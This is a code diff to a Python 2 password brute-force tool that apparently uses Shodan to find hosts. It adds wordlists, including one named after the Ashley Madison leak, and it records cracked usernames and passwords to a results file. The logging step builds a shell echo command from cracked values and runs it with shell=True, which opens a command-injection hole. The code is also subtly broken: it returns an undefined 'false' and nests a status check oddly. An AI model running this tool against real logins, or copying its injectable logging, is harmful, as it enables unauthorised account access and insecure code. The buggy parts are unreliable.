@@ -6,9 +6,15 @@ import sys
 import argparse
 import Queue
 import shodan
+import subprocess
 from os import path
 from termcolor import colored
 
+#DIRECTORY INFOS
+CURR_PATH = path.dirname(path.realpath(__file__))
+
+#LOG FILE
+logfile = CURR_PATH+"/results.csv"
 
 # INSERT YOUR API KEY
 SHODAN_API_KEY = ""
@@ -49,26 +55,31 @@ def helper():
     
 
 def definedefaultpasslist():
+    #Passlists Default
     passlist10 = "/extras/wordlists/10.txt"
-    passlist50 = "/extras/wordlists/50.txt"
+    passlist100 = "/extras/wordlists/100.txt"
     passlistAM = "/extras/wordlists/Ashley_Madison.txt" 
+    passlistStp =  "/extras/wordlists/stupid.txt" 
     
     print ""
     print colored("[*] DEFINE A DEFAULT WORDLIST:", 'blue', attrs=['bold'])
     print colored("[+] 1 - Top 10~ Passwords Wordlist", 'blue', attrs=['bold'])
-    print colored("[+] 2 - Top 50~ Passwords Wordlist", 'blue', attrs=['bold'])
+    print colored("[+] 2 - Top 100~ Passwords Wordlist", 'blue', attrs=['bold'])
     print colored("[+] 3 - Ashley Madison Wordlist", 'blue', attrs=['bold'])
+    print colored("[+] 4 - Stupid Passwords Wordlist", 'blue', attrs=['bold'])
     
     response = int(raw_input("[!] SELECT A WORDLIST: "))
-        
+    print ""    
+    
     if response == 1:
         passlist = passlist10
     elif response == 2:
-        passlist = passlist50
+        passlist = passlist100
     elif response == 3: 
         passlist = passlistAM
+    elif response == 4:
+        passlist = passlistStp
 
-    CURR_PATH = path.dirname(path.realpath(__file__))
     return CURR_PATH + passlist
     
     
@@ -133,6 +144,7 @@ def bruteforce(target,port,ssl, passlist,username):
     fd = open(passlist, 'rw')
     passwords = fd.readlines()
     passes = Queue.Queue()
+        
 
     for password in passwords:
         password = password.rstrip()
@@ -143,6 +155,21 @@ def bruteforce(target,port,ssl, passlist,username):
     print colored("==========================[STARTING TEST]==========================",'yellow', attrs=['bold'])
     print colored("STARTING TEST ON HOST: %s",'blue', attrs=['bold']) % (url)
     print ""
+    
+    #VALIDA A CONEXÃO E/OU SE O ALVO ESTÁ DISPONÍVEL PARA REALIZAR O TESTE
+    try:
+        if ssl is True:
+            validation = requests.get('https://'+url ,verify=False, timeout=8)
+        else:
+            validation = requests.get('http://'+url, timeout=8)
+            
+            if validation.status_code == 200:
+                print colored("[X] INVALID TEST ", 'red', attrs=['bold'])
+                return false
+                
+    except:
+        print colored("[X] NO CONNECTION ", 'red', attrs=['bold'])
+        return false
 
     while not passes.empty():
         password = passes.get()
@@ -168,8 +195,10 @@ def bruteforce(target,port,ssl, passlist,username):
             print colored("               [  :: USER[%s] AND PASS[%s]  ]                      ", 'green', attrs=['bold']) % (username, password)
             print colored("===================================================================", 'yellow', attrs=['bold'])
             
+            #GRAVA LOG
+            log = "echo '%s;%s;%s;%s' >> %s" % (target, port, username, password, logfile)
+            subprocess.call(log, shell=True)
             return True
-            #sys.exit()
         else:
             pass
 
